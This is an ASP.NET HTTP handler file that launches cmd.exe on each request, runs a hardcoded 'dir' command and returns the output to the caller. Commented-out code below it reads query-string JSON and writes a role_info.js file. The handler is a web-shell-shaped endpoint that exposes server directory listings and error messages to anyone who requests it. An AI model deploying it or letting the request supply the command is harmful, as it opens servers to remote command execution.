<%@ WebHandler Language="C#" Class="Get" %>

using System;
using System.Web;
using Newtonsoft.Json;
using Business;
using System.Diagnostics;
public class Get : IHttpHandler
{
    public void ProcessRequest(HttpContext context)
    {
    var result =    ExeCommand("dir");
        context.Response.Write(result);
    }
    public string ExeCommand(string commandText)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.StartInfo.CreateNoWindow = true;
        string resultStrings = null;
        try
        {
            p.Start();
            p.StandardInput.WriteLine(commandText);
            p.StandardInput.WriteLine("exit");
            resultStrings = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            p.Close();
        }
        catch (Exception e)
        {
            resultStrings = e.Message;
        }
        return resultStrings;
    }

    public bool IsReusable
    {
        get
        {
            return false;
        }
    }

}

//mind the method GET not the post
//var json = HttpUtility.UrlDecode(context.Request.QueryString.ToString());

//var result = Handlers.Get(json);

//context.Response.ContentType = "text/json";
//   context.Response.Write(result);
//var path = context.Server.MapPath(@"content\") + "role_info.js";
//System.IO.File.WriteAllText(path,result);